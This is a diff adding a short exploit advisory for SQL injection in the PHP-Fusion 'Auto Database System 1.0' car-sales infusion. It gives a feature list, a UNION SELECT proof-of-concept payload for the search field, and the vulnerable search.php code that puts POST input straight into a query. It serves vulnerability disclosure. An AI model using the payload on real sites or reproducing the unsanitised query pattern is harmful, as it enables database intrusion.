@@ -1,0 +1,59 @@
+# Exploit Title: PHP-Fusion Auto Database System 1.0 Infusion SQL injection
+# Date: 8-2-2011
+# Author: Saif El-Sherei
+# Software Link:
+http://www.php-fusion.co.uk/infusions/addondb/view.php?addon_id=146
+# Version: Auto Database System 1.0 Infusion, PHP-fusion (7.01..03)
+# Tested on: Firefox 3.0.15, , IE 8, mySQL v5
+# Vendor Notified: vendor notified"8-2-2011", awaiting vendor response.
+
+
+Info:
+
+Auto Database System - for sales of cars.
+
+Make new ads for cars - upload up to 5 pictures in each ad.
+
+Info about:
+- Car model/brand
+- Type
+- Fuel type
+- Year
+- Miles
+- Price
+- Doors
+- Color
+- Equipment
+
+Print function on all pages.
+
+Go-back-function on all pages.
+
+Search-function for searching after brand/model.
+
+Mouse-over the small pictures will change the big picture of the cars.
+
+Side-panel incl. that showing the 10 Latest Incoming Cars.
+
+SCREENSHOTS:
+-------------------------
+http://www.dev.dv...r_list.jpg
+http://www.dev.dv...r_desc.jpg
+http://www.dev.dv...ate_ad.jpg
+http://www.dev.dv...in_ads.jpg
+
+Details:
+
+the search variable in "search.php" is not santized before the Db query,
+allowing an attacker to alter the SQL query and gain remote access to the
+server running the infusion.
+
+POC:
+
+' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#
+
+Vulnerable Code:
+
+$result = dbquery("SELECT * FROM ".DB_ADS." WHERE car_model like
+'%".$_POST['SEARCHSTRING']."%'");
+$rows = dbrows($result);
